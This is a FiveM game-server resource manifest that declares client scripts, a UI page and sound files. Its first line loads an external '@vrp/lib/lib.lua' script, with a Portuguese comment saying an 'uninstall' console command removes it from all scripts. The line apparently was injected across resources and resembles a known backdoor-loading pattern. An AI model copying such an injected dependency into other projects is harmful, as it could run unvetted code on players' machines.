client_script "@vrp/lib/lib.lua" --Para remover esta pendencia de todos scripts, execute no console o comando "uninstall"

resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

client_script "client.lua"
client_script '@vrp/lib/utils.lua'

ui_page "html/index.html"

files {
	"html/index.html",
	"html/sounds/twitter.ogg",
	"html/sounds/alarm.mp3",
	"html/sounds/belt.ogg",
	"html/sounds/unbelt.ogg",
	"html/sounds/lock.ogg",
	"html/sounds/cuff.ogg",
	"html/sounds/uncuff.ogg",
	"html/sounds/heartbeat.ogg"
}